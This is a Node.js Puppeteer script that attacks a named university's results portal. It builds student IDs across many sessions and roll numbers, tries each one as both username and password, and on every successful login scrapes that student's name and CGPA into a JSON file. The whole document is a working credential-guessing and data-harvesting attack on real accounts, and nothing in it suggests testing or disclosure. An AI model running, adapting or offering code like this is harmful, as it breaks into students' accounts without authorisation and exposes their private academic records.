const puppeteer = require("puppeteer");
const fs = require("fs");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const department = "CSE"; 
const rollStart = 1;
const rollEnd = 3000;
const failCheck = 40; // consecutive failures before skipping session
const partition = 2; // 1 = commerce, 2 = science, 3 = arts

let successCount = 0;

const retry = async (fn, retries = 3, delay = 2000) => {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (i === retries - 1) throw err;
            console.warn(`⚠️ Retry ${i + 1} due to: ${err.message}`);
            await new Promise(res => setTimeout(res, delay));
        }
    }
};  (async () => {
        const browser = await puppeteer.launch({ headless: true });
        const unchanged = [];

        let lastSuccessRoll = rollStart;

        for (let year = 16; year <= 26; year++) {
            for (const term of ["01", "03"]) {
                const session = `${year}${term}`;
                let failureCount = 0;
                let skipSession = false;

                console.log(`\n🚀 Starting session: ${session}\n`);

                for (let roll = lastSuccessRoll; roll <= rollEnd; roll++) {

                    const userId = `${department}${session}${partition}${String(roll).padStart(4, "0")}`;

                    console.log(`🔍 Trying: ${userId}`);
                    const page = await browser.newPage();
                    await page.setDefaultNavigationTimeout(20000);

                    try {
                        await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));

                        await page.type("#username", userId);
                        await page.type("#password", userId);

                        await Promise.all([
                            page.click("button[type=submit]"),
                            page.waitForNavigation({ waitUntil: "domcontentloaded" })
                        ]);

                        if (page.url().includes("panel")) {
                            console.log(`✅ Login success: ${userId}`);
                            failureCount = 0;
                            lastSuccessRoll = roll + 1;
                            successCount++;

                            await retry(() => page.goto(`${baseUrl}/panel/overallresult`, {
                                waitUntil: "domcontentloaded"
                            }));

                            const data = await page.evaluate(() => {
                                let name = "Unknown";
                                let cgpa = "N/A";

                                const rows = document.querySelectorAll("table.table-bordered.table-striped tbody tr");

                                rows.forEach(row => {
                                    const ths = row.querySelectorAll("th");
                                    const tds = row.querySelectorAll("td");

                                    for (let i = 0; i < ths.length; i++) {
                                        const label = ths[i].textContent.trim();
                                        if (label === "Name :") {
                                            name = tds[i]?.textContent?.trim() || "Unknown";
                                        }
                                    }
                                });

                                const cgpaMatch = document.body.innerHTML.match(/CGPA\s*:<\/b><\/td>\s*<td[^>]*><b>([\d.]+)<\/b>/);
                                if (cgpaMatch) {
                                    cgpa = cgpaMatch[1];
                                }

                                return { name, cgpa };
                            });

                            unchanged.push({ id: userId, ...data });

                            await retry(() => page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" }));
                        } else {
                            failureCount++;
                            console.log(`❌ Login failed: ${userId}`);
                        }

                        if (failureCount >= failCheck) {
                            console.log(`🚫 consecutive failures in session ${session}, moving to next.`);
                            skipSession = true;
                            break;
                        }
                    } catch (err) {
                        failureCount++;
                        console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
                        if (failureCount >= failCheck) {
                            console.log(`🚫 consecutive failures in session ${session}, moving to next.`);
                            skipSession = true;
                            break;
                        }
                    } finally {
                        try {
                            await page.close();
                        } catch (closeErr) {
                            console.warn(`⚠️ Page close failed: ${closeErr.message}`);
                        }
                    }

                    if (skipSession) break;

                    await new Promise(res => setTimeout(res, 500)); // throttle
                }
            }
        }

        await browser.close();

        console.log("\n📋 Final Report:");
        console.table(unchanged);

        fs.writeFileSync("results.json", JSON.stringify(unchanged, null, 2));
    })();
